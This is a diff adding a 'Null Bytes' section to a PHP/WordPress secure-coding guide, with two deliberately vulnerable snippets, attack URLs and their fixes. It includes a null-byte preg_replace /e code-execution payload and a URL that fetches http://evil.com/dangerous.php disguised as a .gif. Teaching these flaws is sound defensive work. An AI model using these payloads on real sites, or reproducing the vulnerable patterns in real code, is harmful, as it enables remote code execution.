@@ -212,6 +212,71 @@ Arbitrary code injection.
 
 * Use `preg_replace_callback()` instead.
 
+Null Bytes
+----------
+PHP is based on C, which uses "null terminated" (`\0`) strings, thus many PHP functions are not binary safe.
+
+### Example: Naive search/replace
+
+```php
+// http://localhost/naive-search-replace.php?pattern=XXX&replace=XX
+$pattern = $_GET['pattern'];
+$replace = $_GET['replace'];
+$new_content = preg_replace( "#$pattern#i", $replace, 'hola mundo' );
+```
+Arbitrary code execution
+
+#### Attack
+
+```
+http://localhost/naive-search-replace.php?pattern=.%2fe%00&replace=echo%20phpversion();
+```
+
+#### Result
+```html
+5.3.6
+```
+
+#### Solution
+* Use `preg_quote`.
+
+```php
+$pattern = preg_quote( $_GET['pattern'], '#' );
+...
+```
+
+### Example: Unsafe file type check
+```php
+$wp_upload_dir = wp_upload_dir();
+$image_cache_dir = $wp_upload_file . '/image-cache/';
+
+$image_name = basename( $_GET['url'] );
+$valid_type = wp_check_filetype( $image_file );
+
+if ( !$valid_type || empty( $valid_type['ext'] ) )
+	die( 'Invalid type.' );
+
+$tmp = download_url( $_GET['url'] );
+copy( $tmp, $image_cache_dir . '/' . $image_file );
+```
+
+PHP code execution
+
+#### Attack
+```
+http://localhost/image-cache.php?file=http://evil.com/dangerous.php%00ignored.gif
+```
+#### Solution
+* Use `sanitize_file_name`
+
+```php
+$image_name = sanitize_file_name( basename( $_GET['url'] ) );
+...
+```
+
+* Keep WordPress up to date -- core fix for `sanitize_file_name` http://core.trac.wordpress.org/changeset/12072
+
+
 
 OS Injection
 ------------
